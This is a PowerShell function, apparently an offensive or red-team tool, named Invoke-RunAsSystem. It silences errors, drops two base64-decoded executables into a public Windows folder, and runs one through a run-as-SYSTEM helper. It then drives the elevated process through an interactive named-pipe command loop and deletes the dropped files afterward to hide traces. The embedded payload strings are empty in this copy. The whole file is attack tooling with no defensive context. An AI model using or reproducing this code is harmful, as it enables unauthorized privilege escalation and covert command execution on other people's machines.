function Invoke-RunAsSystem
{

$ErrorActionPreference = "SilentlyContinue"

$script = ""
$runassystem = ""

$scriptoutputFilePath = "C:\Users\Public\Documents\script.exe"
$runassystemoutputFilePath = "C:\Users\Public\Documents\runas.exe"

$scriptbyteArray = [Convert]::FromBase64String($script)
$runasbyteArray = [Convert]::FromBase64String($runassystem)

[System.IO.File]::WriteAllBytes($scriptoutputFilePath, $scriptbyteArray)
[System.IO.File]::WriteAllBytes($runassystemoutputFilePath, $runasbyteArray)

C:\Users\Public\Documents\runas.exe C:\Users\Public\Documents\script.exe > $null

$pipeName = "MyUniquePipeName"

$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream('.', $pipeName, 'InOut')
$pipeClient.Connect()

$sr = New-Object System.IO.StreamReader($pipeClient)
$sw = New-Object System.IO.StreamWriter($pipeClient)

$serverOutput = ""
while ($true) {
    $userCommand = Read-Host "Enter Command"
    $sw.WriteLine($userCommand)
    $sw.Flush()

    if ($userCommand -eq "exit") {
        break
    }

    $serverOutput = ""
    while ($true) {
        $line = $sr.ReadLine()

        if ($line -eq "###END###") {  # Check for the delimiter
            Write-Output $serverOutput.Trim()  # Print the entire result at once
            break
        } else {
            $serverOutput += "$line`n"  # Accumulate the output until the delimiter is found
        }
    }
}

$sr.Close()
$sw.Close()

Start-Sleep 1

del C:\Users\Public\Documents\script.exe
del C:\Users\Public\Documents\runas.exe
}